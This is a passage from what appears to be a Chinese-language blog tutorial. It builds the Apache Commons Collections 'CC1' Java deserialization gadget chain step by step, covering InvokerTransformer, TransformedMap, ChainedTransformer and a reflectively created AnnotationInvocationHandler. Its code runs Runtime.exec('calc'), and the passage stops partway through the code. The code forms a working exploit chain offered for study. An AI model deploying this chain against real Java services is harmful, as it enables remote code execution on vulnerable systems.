src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/image-20240401200110373.png" alt="image-20240401200110373"></p><p>这个类接受三个参数：方法名、参数类型、参数。并在transform方法里进行反射调用。这里三个参数都是我们可控的，完全可以任意方法调用。</p><p>更重要的是，这个类是Serializable的，可以被序列化。</p><p>所以这个类就是我们链子的终点。</p><p>测试测试这个类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们调用exec方法，参数类型字符串，参数值是calc</p><p>找到终点后逆向寻找，看看哪里调用了transform方法。就是下图的O.aaa方法</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/image-20240401201148989.png" alt="image-20240401201148989"></p><hr style="border: 1px solid black;"/><p>最终确定了<strong>TransformedMap类</strong>调用transform方法并可以利用。<img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/image-20240401201452145.png" alt="image-20240401201452145"></p><p>它的<strong>checkSetValue</strong>方法调用了transform方法。<strong>这里的value应该是Runtime.getRuntime()对象。</strong><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/image-20240401201623658.png" alt="image-20240401201623658"></p><p>我们看看这个类的构造函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-title function_">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-built_in">this</span>.keyTransformer = keyTransformer;<br>        <span class="hljs-built_in">this</span>.valueTransformer = valueTransformer;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这个构造函数是protected，所以得让它<strong>自己调用自己（本类调用）</strong>。它接受三个参数：Obj.map，keyTransformer ，valueTransformer。</p><p>而valueTransformer跟transform的调用有关，我们找找哪里也调用了valueTransformer。</p><hr style="border: 1px solid black;"/><p>在这个类里，有一个静态方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);<br>&#125;<br></code></pre></td></tr></table></figure><p>这个方法new 了它自己的类，这里可以作为valueTransformer类的入口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);    <span class="hljs-comment">//new 一个InvokerTransformer对象来作为valueTransformer</span><br>HashMap&lt;Object,Object&gt; inmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();    <span class="hljs-comment">//我们new 一个map对象</span><br><br><span class="hljs-comment">//因为只有valueTransformer跟transform的调用有关，所以decorate的第二个参数可以设置为null</span><br>TransformedMap.decorate(inmap,<span class="hljs-literal">null</span>,invokerTransformer);   <span class="hljs-comment">//调用静态decorate方法，才能new一个TransformedMap对象</span><br></code></pre></td></tr></table></figure><p>new 一个TransformedMap对象后我们需要找找哪里调用了checkSetValue方法。</p><hr style="border: 1px solid black;"/><p>只有一处调用了，就是TransformedMap的父类AbstractInputCheckedMapDecorator类里有一个MapEntry类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MapEntry</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMapEntryDecorator</span> &#123;<br><br>    <span class="hljs-comment">/** The parent map */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AbstractInputCheckedMapDecorator parent;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">MapEntry</span><span class="hljs-params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;<br>        <span class="hljs-built_in">super</span>(entry);<br>        <span class="hljs-built_in">this</span>.parent = parent;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object value)</span> &#123;<br>        value = parent.checkSetValue(value);            <span class="hljs-comment">//调用checkSetValue方法</span><br>        <span class="hljs-keyword">return</span> entry.setValue(value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>正常来讲，只要遍历了被修饰过的map，就能走到MapEntry类，也就会调用MapEntry类的setValue方法(传进去的value是Runtime.getRuntime()对象)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] arge)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();     <span class="hljs-comment">//新建Runtime.getRuntime()对象</span><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;mate-calc&quot;</span>&#125;);    <span class="hljs-comment">//new 一个InvokerTransformer对象来作为valueTransformer</span><br>        HashMap&lt;Object,Object&gt; inmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();    <span class="hljs-comment">//我们new 一个map对象</span><br>        inmap.put(<span class="hljs-string">&quot;key&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);          <span class="hljs-comment">//修饰map</span><br><br><span class="hljs-comment">//因为只有valueTransformer跟transform的调用有关，所以decorate的第二个参数可以设置为null</span><br>        Map&lt;Object,Object&gt; outmap = TransformedMap.decorate(inmap,<span class="hljs-literal">null</span>,invokerTransformer);   <span class="hljs-comment">//调用静态decorate方法，才能new一个TransformedMap对象</span><br>        <span class="hljs-keyword">for</span>(Map.Entry entry: outmap.entrySet())&#123;          <span class="hljs-comment">//遍历被修饰的map，走到MapEntry类</span><br>            entry.setValue(r);                  <span class="hljs-comment">//调用entry.setValue，传入Runtime.getRuntime()对象，执行命令。</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们来run一下这段代码。</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/image-20240401215126327.png" alt="image-20240401215126327"></p><p>弹计算器了，说明我们走到现在，这条链子是没问题的。</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/image-20240401215358786.png" alt="image-20240401215358786"></p><p>现在我们找找，谁的readObject里面调用了（Map.Entry）setValue</p><hr style="border: 1px solid black;"/><p>在AnnotationInvocationHandler类的readObject里找到了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>        s.defaultReadObject();<br><br>        <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            annotationType = AnnotationType.getInstance(type);<br>        &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>        &#125;<br><br>        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br><br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;           <span class="hljs-comment">//有Map.Entry</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    memberValue.setValue(                <span class="hljs-comment">//调用setValue</span><br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                                annotationType.members().get(name)));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>更巧的是，AnnotationInvocationHandler类是可序列化的。那这里明显就是最终出口了。</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/image-20240401215947659.png" alt="image-20240401215947659"></p><p>我们看看它的构造函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler(Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;<br>        <span class="hljs-built_in">this</span>.type = type;<br>        <span class="hljs-built_in">this</span>.memberValues = memberValues;<br>    &#125;<br></code></pre></td></tr></table></figure><p>它接受两个参数，第一个参数是Class，它继承了Annotation，Annotation在java里是注解。即@Override</p><p>第二个参数是Map，我们可控，我们就可以把我们设计好的TransformedMap传进去。</p><p>还有一点，我们注意这个类的声明，它并没有写public，没写就是default类型。只能在它自己的包底下才能访问到。所以我们只能通过反射获取到，不能直接获取。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);       <span class="hljs-comment">//反射获取类</span><br><span class="hljs-type">Constructor</span> <span class="hljs-variable">constructorhandler</span> <span class="hljs-operator">=</span> handler.getDeclaredConstructor(Class.class, Map.class);     <span class="hljs-comment">//获取构造器，因为构造器也不是共有的，所以要用getDeclaredConstructor</span><br>constructorhandler.setAccessible(<span class="hljs-literal">true</span>);         <span class="hljs-comment">//确保它可以访问</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> constructorhandler.newInstance(Override.class,outmap);     <span class="hljs-comment">//实例化它，第一个参数是注解，第二个参数是map</span><br>serialize(obj);<br></code></pre></td></tr></table></figure><p>如果写到这里。我们的链子应该大概完成了，但是这里我们还需要解决三个问题。</p><hr style="border: 1px solid black;"/><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>1、上文中说过，setValue里的value应该是Runtime.getRuntime()对象。但是在AnnotationInvocationHandler类里的setValue里是给定的一个对象，我们好像不可控。</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/image-20240401221608826.png" alt="image-20240401221608826"></p><p>2、还是关于Runtime.getRuntime()对象的，这里我们的链子里Runtime.getRuntime()对象是我们自己new的，但其实这个对象是不能被序列化的。(不是Serializable的)</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/image-20240401221725370.png" alt="image-20240401221725370"></p><p>3、在最后的AnnotationInvocationHandler类里readObject方法里还需要进两个if，这个我们下文分析。</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/image-20240401222005194.png" alt="image-20240401222005194"></p><hr style="border: 1px solid black;"/><h1 id="分析-解决"><a href="#分析-解决" class="headerlink" title="分析&amp;解决"></a>分析&amp;解决</h1><h4 id="序列化的问题"><a href="#序列化的问题" class="headerlink" title="序列化的问题"></a>序列化的问题</h4><p>对于问题Runtime.getRuntime()对象不能序列化的问题，它虽然不能序列化，但是他的原型class可以。</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/image-20240401222457849.png" alt="image-20240401222457849"></p><p>他的构造器也是私有的(也就是所谓的单例模式，这里不再赘述)，但是Runtime类里有个静态方法getRuntime()正好返回了Runtime类的对象。</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/image-20240401222645865.png" alt="image-20240401222645865"></p><p>我们先写一个正常的反射：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Runtime.class;           <span class="hljs-comment">//拿到Runtime的class</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">getRuntime</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>);        <span class="hljs-comment">//null是因为getRuntime是无参方法</span><br><span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) getRuntime.invoke(<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>);         <span class="hljs-comment">//等于 Runtime r = Runtime.getRuntime();</span><br><span class="hljs-comment">//第一个null是因为这里是静态方法，不需要填在哪个对象上调用。第二个null是因为是空参构造</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>,String.class);     <span class="hljs-comment">//sting是exec的参数</span><br>exec.invoke(r,<span class="hljs-string">&quot;calc&quot;</span>);           <span class="hljs-comment">//在r这个对象上调用exec方法执行命令</span><br></code></pre></td></tr></table></figure><p>类似的，因为我们最后需要TransformedMap对象，所以我们围绕invokerTransformer来写这样的一条反射链</p><p>我们可以利用InvokerTransformer调用getMethod方法，让其在Runtime.class对象上调用getRuntime方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Method</span> <span class="hljs-variable">getRuntime</span> <span class="hljs-operator">=</span> (Method) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;).transform(Runtime.class);<br></code></pre></td></tr></table></figure><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/image-20240402181416271.png" alt="image-20240402181416271"></p><p>getMethod的参数是String和Class数组，所以InvokerTransformer第二个参数是new Class[]{String.class,Class[].class}</p><p>拿到getRuntime方法后，又对其调用了它的invoke方法。</p><p>我们可以利用InvokerTransformer在getRuntime上调用invoke方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;).transform(getRuntime);<br></code></pre></td></tr></table></figure><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/image-20240402182109157.png" alt="image-20240402182109157"></p><p>invoke的参数是Object和Object数组，所以InvokerTransformer第二个参数是new Class[]{Object.class,Object[].class}。invoke的参数值是空的，传入两个Null即可。</p><p>第三步就是在Runtime对象上调用exec方法执行命令。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);<br></code></pre></td></tr></table></figure><p>至此我们就实现了Transformer的循环调用。</p><p>但是这样写会很复杂，我们需要写很多函数，而Transformer类中有一个ChainedTransformer专门就是干这个的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> &#123;                <span class="hljs-comment">//接受Transformer数组进去</span><br>        <span class="hljs-built_in">super</span>();<br>        iTransformers = transformers;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object object)</span> &#123;                          <span class="hljs-comment">//进行递归调用</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; iTransformers.length; i++) &#123;<br>            object = iTransformers[i].transform(object);<br>        &#125;<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br></code></pre></td></tr></table></figure><p>所以我们可以把上面的InvokerTransformer写成Transformer数组，再传入ChainedTransformer即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">       Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>       &#125;;<br>       <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>chainedTransformer.transform(Runtime.class);          <span class="hljs-comment">//作为最开始的输入传入，其他的都是互相嵌套而已。</span><br></code></pre></td></tr></table></figure><p>运行以上代码，成功弹计算器，说明序列化这个问题我们搞定了！</p><hr style="border: 1px solid black;"/><h4 id="关于两个if的问题"><a href="#关于两个if的问题" class="headerlink" title="关于两个if的问题"></a>关于两个if的问题</h4><p>我们可以调试看看。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] arge)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object,Object&gt; inmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(); <br>        inmap.put(<span class="hljs-string">&quot;key&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>); <br>        Map&lt;Object,Object&gt; outmap = TransformedMap.decorate(inmap,<span class="hljs-literal">null</span>,chainedTransformer);   <br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);     <br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructorhandler</span> <span class="hljs-operator">=</span> handler.getDeclaredConstructor(Class.class, Map.class);     <br>        constructorhandler.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> constructorhandler.newInstance(Override.class,outmap); <br>        serialize(obj);<br>        unserialize(<span class="hljs-string">&quot;serialize&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span 